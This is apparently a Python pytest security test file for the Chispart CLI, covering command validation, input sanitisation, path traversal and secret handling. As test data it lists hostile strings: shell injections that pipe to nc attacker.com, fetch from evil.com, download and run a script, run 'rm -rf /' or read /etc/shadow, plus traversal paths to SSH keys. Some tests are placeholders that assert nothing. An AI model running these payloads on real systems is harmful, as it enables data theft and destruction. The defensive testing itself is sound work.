"""
Tests de seguridad para Chispart CLI
Incluye tests de validación de comandos, sanitización de entrada, y protecciones
"""

import pytest
import os
import sys
from unittest.mock import patch, MagicMock
import tempfile
import subprocess

# Agregar el directorio padre al path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from config_extended import PLAN_BASED_SECURITY_CONFIG, get_security_config
from chispart_dev_agent_v3 import validate_api_key, create_text_message
from core.config_manager import ConfigManager

# Intentar importar security_manager
try:
    from core.security_manager import SecurityManager
    SECURITY_MANAGER_AVAILABLE = True
except ImportError:
    SECURITY_MANAGER_AVAILABLE = False


@pytest.mark.skipif(not SECURITY_MANAGER_AVAILABLE, reason="Security manager no disponible")
class TestPlanBasedSecurity:
    """Tests para la seguridad basada en planes"""

    @pytest.fixture
    def mock_config_manager(self, mocker):
        """Fixture para mockear el ConfigManager"""
        mock = mocker.patch('core.security_manager.get_config_manager')
        instance = mock.return_value
        return instance

    @pytest.mark.parametrize("plan, allowed_command, disallowed_command", [
        ("free", "ls", "git"),
        ("basic", "git", "docker"),
        ("pro", "docker", "sudo"),
    ])
    def test_plan_command_validation(self, mock_config_manager, plan, allowed_command, disallowed_command):
        """Test que la validación de comandos funciona según el plan"""
        mock_config_manager.get_user_plan.return_value = plan
        
        security_manager = SecurityManager()
        
        # Probar comando permitido
        validation_allowed = security_manager.validate_command(allowed_command)
        assert validation_allowed.is_allowed, f"Comando '{allowed_command}' debería estar permitido en el plan '{plan}'"
        
        # Probar comando no permitido
        validation_disallowed = security_manager.validate_command(disallowed_command)
        assert not validation_disallowed.is_allowed, f"Comando '{disallowed_command}' debería estar bloqueado en el plan '{plan}'"

    def test_default_to_free_plan(self, mock_config_manager):
        """Test que por defecto se usa el plan 'free' si el plan no es válido"""
        mock_config_manager.get_user_plan.return_value = "invalid_plan"
        
        security_manager = SecurityManager()

        # 'ls' está en el plan free, 'git' no.
        validation_ls = security_manager.validate_command("ls")
        assert validation_ls.is_allowed

        validation_git = security_manager.validate_command("git")
        assert not validation_git.is_allowed

    def test_security_status_includes_plan(self, mock_config_manager):
        """Test que get_security_status incluye el plan actual"""
        mock_config_manager.get_user_plan.return_value = "pro"
        
        security_manager = SecurityManager()
        status = security_manager.get_security_status()

        assert "plan" in status
        assert status["plan"] == "pro"
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test prevención de inyección de comandos"""
        injection_attempts = [
            "ls; rm -rf /",
            "pwd && cat /etc/passwd",
            "echo hello | nc attacker.com 1234",
            "ls `rm important_file`",
            "pwd $(curl evil.com)",
            "ls; wget malicious.com/script.sh; chmod +x script.sh; ./script.sh",
            "echo test > file.txt; cat /etc/shadow >> file.txt"
        ]
        
        # Estos comandos deberían ser detectados como peligrosos
        for injection_cmd in injection_attempts:
            # Verificar que contienen patrones peligrosos
            dangerous_patterns = [';', '&&', '|', '`', '$', '>', '>>', '<']
            has_dangerous_pattern = any(pattern in injection_cmd for pattern in dangerous_patterns)
            
            if has_dangerous_pattern:
                # El comando debería ser tratado con precaución
                assert True  # Placeholder - la implementación real debería validar esto


class TestInputSanitization:
    """Tests de sanitización de entrada"""
    
    @pytest.mark.security
    def test_api_key_sanitization(self):
        """Test sanitización de claves API"""
        # Claves API maliciosas o malformadas (sin caracteres nulos que causan problemas con os.environ)
        malicious_keys = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(curl evil.com)",
            "`rm -rf /`",
            "key\nwget evil.com"
        ]
        
        for malicious_key in malicious_keys:
            with patch.dict(os.environ, {'BLACKBOX_API_KEY': malicious_key}):
                try:
                    config = validate_api_key('chispart')
                    # Si no falla, al menos verificar que la clave se maneja de forma segura
                    assert isinstance(config['api_key'], str)
                except SystemExit:
                    # Es aceptable que falle con claves inválidas
                    pass
        
        # Test separado para caracteres nulos (que no se pueden usar en os.environ)
        try:
            # Crear un mock de la función get_api_config para devolver una clave con caracteres nulos
            with patch('chispart_dev_agent_v3.get_api_config') as mock_get_config:
                mock_get_config.return_value = {
                    "name": "Test API",
                    "base_url": "https://test.api",
                    "api_key": "key\x00hidden",
                    "timeout": 30,
                    "connect_timeout": 5,
                    "read_timeout": 30
                }
                
                # Llamar a validate_api_key con cualquier nombre de API
                config = validate_api_key('test')
                
                # Verificar que la clave fue sanitizada (sin caracteres nulos)
                assert "\x00" not in config['api_key']
                assert config['api_key'] == "keyhidden"
        except Exception as e:
            # Debería manejar la excepción correctamente
            assert False, f"Error sanitizando clave con caracteres nulos: {e}"
    
    @pytest.mark.security
    def test_message_content_sanitization(self):
        """Test sanitización de contenido de mensajes"""
        # Contenido potencialmente malicioso
        malicious_contents = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE messages; --",
            "../../etc/passwd",
            "\x00\x01\x02binary_data",
            "content\nwith\nnewlines\nand\ncommands: rm -rf /",
            "very_long_content" * 10000,  # Contenido muy largo
            "unicode_test: 🚀💻🔒",
            "special_chars: !@#$%^&*()[]{}|\\:;\"'<>?,./"
        ]
        
        for malicious_content in malicious_contents:
            try:
                message = create_text_message(malicious_content)
                
                # Verificar que el mensaje se creó correctamente
                assert isinstance(message, dict)
                assert 'role' in message
                assert 'content' in message
                assert message['role'] == 'user'
                
                # El contenido debería estar presente (puede estar sanitizado)
                assert isinstance(message['content'], str)
                
            except Exception as e:
                # Es aceptable que falle con contenido muy malicioso
                assert isinstance(e, (ValueError, TypeError, UnicodeError))
    
    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test prevención de path traversal"""
        malicious_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\sensitive_file"
        ]
        
        # Simular validación de paths (implementación específica puede variar)
        for malicious_path in malicious_paths:
            # Verificar que contiene patrones de path traversal
            has_traversal = any(pattern in malicious_path for pattern in ['../', '..\\', '/etc/', 'C:\\'])
            
            if has_traversal:
                # El path debería ser rechazado por validaciones de seguridad
                assert True  # Placeholder - implementación real debería validar


class TestEnvironmentSecurity:
    """Tests de seguridad del entorno"""
    
    @pytest.mark.security
    def test_environment_variable_isolation(self):
        """Test aislamiento de variables de entorno"""
        # Verificar que variables sensibles no se exponen
        sensitive_vars = ['PASSWORD', 'SECRET', 'TOKEN', 'PRIVATE_KEY']
        
        current_env = os.environ.copy()
        
        for var_name in sensitive_vars:
            if var_name in current_env:
                # Variables sensibles no deberían estar en el entorno de pruebas
                print(f"Advertencia: Variable sensible encontrada: {var_name}")
    
    @pytest.mark.security
    def test_temporary_file_security(self):
        """Test seguridad de archivos temporales"""
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
            temp_path = temp_file.name
            temp_file.write("sensitive data")
        
        try:
            # Verificar permisos del archivo temporal
            file_stat = os.stat(temp_path)
            file_mode = oct(file_stat.st_mode)[-3:]
            
            # El archivo no debería ser legible por otros usuarios
            assert file_mode[2] in ['0', '4'], f"Archivo temporal con permisos inseguros: {file_mode}"
            
        finally:
            # Limpiar archivo temporal
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    @pytest.mark.security
    def test_process_isolation(self):
        """Test aislamiento de procesos"""
        # Verificar que no se ejecutan procesos con privilegios elevados
        current_process = os.getpid()
        
        try:
            # Verificar que no somos root (en sistemas Unix)
            if hasattr(os, 'getuid'):
                uid = os.getuid()
                assert uid != 0, "Tests ejecutándose como root - riesgo de seguridad"
        except AttributeError:
            # En Windows, verificar que no somos administrador
            pass


class TestDataProtection:
    """Tests de protección de datos"""
    
    @pytest.mark.security
    def test_api_key_not_logged(self):
        """Test que las claves API no se registran en logs"""
        test_api_key = "sk-test123456789abcdef"
        
        with patch.dict(os.environ, {'BLACKBOX_API_KEY': test_api_key}):
            # Simular operación que podría registrar la clave
            try:
                config = validate_api_key('chispart')
                
                # La clave no debería aparecer en representaciones string
                config_str = str(config)
                
                # Verificar que la clave API está oculta en la representación string
                assert "***" in config_str, "No se encontró el marcador de ocultación '***' en la representación"
                assert test_api_key not in config_str, "Clave API expuesta en representación string"
                
                # Verificar también la representación repr
                config_repr = repr(config)
                assert "***" in config_repr, "No se encontró el marcador de ocultación '***' en repr"
                assert test_api_key not in config_repr, "Clave API expuesta en repr"
                
            except SystemExit:
                pass
    
    @pytest.mark.security
    def test_sensitive_data_in_memory(self):
        """Test manejo de datos sensibles en memoria"""
        sensitive_data = "very_sensitive_password_123"
        
        # Crear mensaje con datos sensibles
        message = create_text_message(f"Password: {sensitive_data}")
        
        # Verificar que el mensaje se maneja correctamente
        assert isinstance(message, dict)
        
        # En una implementación real, los datos sensibles deberían ser
        # limpiados de la memoria después del uso
        del message
        del sensitive_data
    
    @pytest.mark.security
    def test_configuration_file_permissions(self):
        """Test permisos de archivos de configuración"""
        config_files = [
            '.env',
            'config/chispart_config.json',
            'chat_history.json'
        ]
        
        for config_file in config_files:
            config_path = os.path.join('..', config_file)
            if os.path.exists(config_path):
                file_stat = os.stat(config_path)
                file_mode = oct(file_stat.st_mode)[-3:]
                
                # Archivos de configuración no deberían ser legibles por otros
                if file_mode[2] not in ['0', '4']:
                    print(f"Advertencia: Archivo de configuración con permisos inseguros: {config_file} ({file_mode})")


class TestNetworkSecurity:
    """Tests de seguridad de red"""
    
    @pytest.mark.security
    def test_https_enforcement(self):
        """Test que se usa HTTPS para APIs"""
        from config_extended import AVAILABLE_APIS
        
        for api_name, api_config in AVAILABLE_APIS.items():
            base_url = api_config['base_url']
            
            # Todas las URLs de API deberían usar HTTPS
            assert base_url.startswith('https://'), f"API {api_name} no usa HTTPS: {base_url}"
    
    @pytest.mark.security
    def test_no_hardcoded_credentials(self):
        """Test que no hay credenciales hardcodeadas"""
        # Leer el archivo principal para buscar credenciales hardcodeadas
        main_file_path = os.path.join('..', 'chispart_dev_agent_v3.py')
        
        if os.path.exists(main_file_path):
            with open(main_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Patrones que podrían indicar credenciales hardcodeadas
            suspicious_patterns = [
                'password = "',
                'api_key = "sk-',
                'token = "',
                'secret = "',
                'key = "AIza',  # Google API key pattern
                'Bearer eyJ'     # JWT token pattern
            ]
            
            for pattern in suspicious_patterns:
                assert pattern not in content, f"Posible credencial hardcodeada encontrada: {pattern}"
    
    @pytest.mark.security
    def test_request_timeout_limits(self):
        """Test que hay límites de timeout para requests"""
        from config_extended import REQUEST_TIMEOUT, CONNECT_TIMEOUT, READ_TIMEOUT
        
        # Verificar que los timeouts están configurados
        assert REQUEST_TIMEOUT > 0, "REQUEST_TIMEOUT debe ser positivo"
        assert CONNECT_TIMEOUT > 0, "CONNECT_TIMEOUT debe ser positivo"
        assert READ_TIMEOUT > 0, "READ_TIMEOUT debe ser positivo"
        
        # Verificar que los timeouts no son excesivamente largos
        assert REQUEST_TIMEOUT <= 300, "REQUEST_TIMEOUT muy largo (>5 min)"
        assert CONNECT_TIMEOUT <= 60, "CONNECT_TIMEOUT muy largo (>1 min)"
        assert READ_TIMEOUT <= 300, "READ_TIMEOUT muy largo (>5 min)"




if __name__ == '__main__':
    # Ejecutar solo tests de seguridad
    pytest.main([__file__, '-v', '-m', 'security'])
